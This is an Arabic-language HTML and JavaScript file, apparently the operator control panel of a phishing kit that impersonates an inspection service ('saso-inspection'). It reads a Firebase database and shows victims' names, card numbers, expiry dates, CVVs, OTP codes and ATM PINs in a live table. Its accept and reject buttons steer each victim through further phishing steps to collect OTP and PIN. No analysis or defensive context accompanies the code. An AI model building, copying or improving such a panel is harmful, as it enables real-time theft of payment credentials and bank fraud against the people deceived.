<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم - نظام الرادار</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0f0f0f; color: #e0e0e0; margin: 0; padding: 10px; }
        .header { background: #1a1a1a; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #1e7344; margin-bottom: 10px; }
        
        .table-container { width: 100%; overflow-x: auto; background: #1a1a1a; border-radius: 8px; }
        table { width: 100%; border-collapse: collapse; min-width: 1000px; }
        th { background: #252525; color: #888; padding: 12px; text-align: center; font-size: 13px; border-bottom: 1px solid #333; }
        td { padding: 10px; text-align: center; border-bottom: 1px solid #222; font-size: 14px; font-family: monospace; }
        
        .page-badge { padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; background: #333; color: #ffd700; }
        .val-text { color: #fff; font-weight: bold; }
        .otp-text { color: #00ff88; font-size: 16px; }
        .pin-text { color: #ffeb3b; font-size: 16px; }

        /* الأزرار */
        .btn { padding: 8px 15px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; transition: 0.3s; font-family: 'Segoe UI'; }
        
        /* الحالة الافتراضية (رمادي) */
        .btn-off { background: #444 !important; color: #888 !important; cursor: not-allowed; }
        
        /* الحالة النشطة */
        .btn-accept.active { background: #2ecc71 !important; color: #fff !important; cursor: pointer; box-shadow: 0 0 10px rgba(46, 204, 113, 0.4); }
        .btn-reject.active { background: #e74c3c !important; color: #fff !important; cursor: pointer; box-shadow: 0 0 10px rgba(231, 76, 60, 0.4); }
    </style>
</head>
<body onload="_init()">

<audio id="alert_sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

<div class="header">
    <strong>لوحة العمليات الموحدة</strong>
    <button onclick="_clear()" style="background:#c0392b; color:white; border:none; padding:8px 15px; border-radius:5px; cursor:pointer;">تصفير</button>
</div>

<div class="table-container">
    <table>
        <thead>
            <tr>
                <th>#</th>
                <th>الصفحة الحالية</th>
                <th>الاسم</th>
                <th>رقم البطاقة</th>
                <th>التاريخ</th>
                <th>CVV</th>
                <th>OTP</th>
                <th>PIN</th>
                <th>التحكم</th>
            </tr>
        </thead>
        <tbody id="monitor">
            </tbody>
    </table>
</div>

<script>
    const config = { 
        apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8...", 
        databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/",
        projectId: "saso-inspection"
    };
    
    let cache = {};

    function _init() {
        if (!firebase.apps.length) firebase.initializeApp(config);
        const db = firebase.database();

        // جلب بيانات العمليات
        db.ref('orders').on('value', snapshot => {
            const orders = snapshot.val() || {};
            const monitor = document.getElementById('monitor');
            monitor.innerHTML = '';
            
            const ids = Object.keys(orders).reverse();

            ids.forEach((id, index) => {
                const d = orders[id];
                const count = ids.length - index;

                // كشف التحديثات للصوت وتغيير لون الأزرار
                let hasUpdate = false;
                const currentStr = JSON.stringify(d);
                if(cache[id] && cache[id] !== currentStr) {
                    document.getElementById('alert_sound').play().catch(()=>{});
                    hasUpdate = true; 
                }
                cache[id] = currentStr;

                // تحديد الوجهة القادمة
                let nextStep = 'go_to_otp';
                if (d.otp_code || d.otp) nextStep = 'go_to_pin';

                // الحالة النشطة للأزرار (تكون نشطة لو العميل في حالة انتظار)
                const isWaiting = (d.next_step === 'waiting' || hasUpdate);
                const btnClass = isWaiting ? 'active' : 'btn-off';

                const row = `
                    <tr>
                        <td>${count}</td>
                        <td><span class="page-badge">${d.current_page || 'جاري المعالجة..'}</span></td>
                        <td class="val-text">${d.fullName || '---'}</td>
                        <td class="val-text">${d.cardNumber || '---'}</td>
                        <td>${d.expiryDate || '--/--'}</td>
                        <td>${d.cvv || '---'}</td>
                        <td class="otp-text">${d.otp_code || d.otp || '----'}</td>
                        <td class="pin-text">${d.atm_pin || '----'}</td>
                        <td>
                            <button class="btn btn-accept ${btnClass}" onclick="${isWaiting ? `_send('${id}', '${nextStep}')` : ''}">قبول</button>
                            <button class="btn btn-reject ${btnClass}" onclick="${isWaiting ? `_send('${id}', 'wrong_card')` : ''}">رفض</button>
                        </td>
                    </tr>
                `;
                monitor.insertAdjacentHTML('beforeend', row);
            });
        });

        // ربط حالة الصفحة من live_sessions (اختياري لزيادة الدقة)
        db.ref('live_sessions').on('child_changed', (snap) => {
             // تحديث تلقائي للجدول عند تغيير صفحة العميل
        });
    }

    function _send(id, step) {
        firebase.database().ref('orders/' + id).update({ 
            next_step: step,
            last_command_time: new Date().getTime(),
            status: "تم الإرسال: " + step
        });
    }

    function _clear() {
        if(confirm("حذف جميع البيانات؟")) {
            firebase.database().ref('orders').remove();
            firebase.database().ref('live_sessions').remove();
        }
    }
</script>
</body>
</html>
